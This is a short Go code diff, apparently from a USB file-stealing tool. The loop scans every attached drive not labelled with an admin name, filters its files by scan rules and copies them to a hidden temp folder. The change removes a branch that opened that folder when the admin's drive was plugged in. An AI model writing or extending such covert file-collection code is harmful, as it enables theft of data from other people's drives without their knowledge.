@@ -162,9 +162,7 @@ func main() {
 		for _, usb_drive := range usb_drives {
 			usb_drive_label := getDriveLabel(usb_drive)
 
-			if usb_drive_label == admin_name {
-				exec.Command("cmd", "/c", "start "+temp_path[:len(temp_path)-1]).Run()
-			} else {
+			if usb_drive_label != admin_name {
 				files := scanDisk(usb_drive, scan_level)
 				files = filter(files, scan_rules)
 				copyToTemp(files, temp_path+"/"+usb_drive_label+"/")
